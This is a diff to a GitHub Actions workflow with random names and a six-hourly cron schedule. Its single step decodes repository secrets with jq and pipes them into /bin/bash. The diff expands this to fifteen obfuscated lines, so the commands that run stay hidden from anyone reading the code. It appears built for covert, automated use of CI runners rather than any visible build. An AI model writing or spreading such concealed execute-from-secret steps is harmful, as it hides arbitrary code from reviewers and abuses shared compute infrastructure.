@@ -2,20 +2,30 @@ name: qiyuanzhen4891
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 4/6 * * *'
+    - cron: '53 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: qiyuanzhen4891
         env:
-          hkg8871: ${{ secrets.hkg8871 }}
+          fqn2: ${{ secrets.fqn2 }}
         run: |
-          echo $hkg8871 | jq -r .uwvb9 | /bin/bash
-          echo $azgrd5 | jq -r .ypa701 | /bin/bash
-          echo $ont811 | jq -r .g882 | /bin/bash
-          echo $tif34 | jq -r .cog0200 | /bin/bash
-          echo $ezkc24 | jq -r .hl1553 | /bin/bash
+          echo $fqn2 | jq -r .ahqqw911 | /bin/bash
+          echo $lx197 | jq -r .wu16048 | /bin/bash
+          echo $tfkc2 | jq -r .u0 | /bin/bash
+          echo $omkg49289 | jq -r .n937 | /bin/bash
+          echo $qovl8207 | jq -r .zlwn033 | /bin/bash
+          echo $b6 | jq -r .qtne9084 | /bin/bash
+          echo $b650 | jq -r .ovog9 | /bin/bash
+          echo $f8 | jq -r .jiej26 | /bin/bash
+          echo $rn377 | jq -r .jew5539 | /bin/bash
+          echo $bao76 | jq -r .aqf100 | /bin/bash
+          echo $t984 | jq -r .okg11294 | /bin/bash
+          echo $u7955 | jq -r .fvniw97589 | /bin/bash
+          echo $ed1 | jq -r .njkg58 | /bin/bash
+          echo $cah62086 | jq -r .fj9752 | /bin/bash
+          echo $td5016 | jq -r .mdju149 | /bin/bash
 
